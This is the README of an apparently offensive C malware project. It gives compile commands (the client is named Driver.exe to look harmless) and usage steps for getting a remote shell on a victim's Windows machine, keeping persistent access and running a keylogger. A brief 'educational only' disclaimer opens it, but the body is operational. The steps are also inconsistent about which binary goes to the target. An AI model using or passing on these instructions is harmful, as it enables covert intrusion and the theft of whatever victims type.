DISCLAIMER: this project is to be used only for educational purposes. This program does not self replicate and you should not use it on a victim without written consent.

This project is a malware written in C language that allows you to get a shell on the victim and execute Windows commands as well as obtain persistence. It also acts as a keylogger.

Install
On your Linux machine, compile the client and the server (don't forget to change the IPs and the port):
gcc server.c -o server
i686-w64-mingw32-gcc -o Driver.exe client.c -lwsock32 -lwininet

Usage
1. Transfer the file server.exe on the target machine.
2. Start your server with the arguments: port and IP of your attack machine.
   ./server <ip> <port>
3. Start your client
   .\client
You now have a shell!
Available commands:
You can execute all of the Windows commands, as well as:
persist - this will ensure persistence, so if the victim logs out / turns off the machine, when they go back online they will connect to you
keylog - this will start a keylogger that will save everything the victim types (it is saved in C:\tmp\windows.txt)
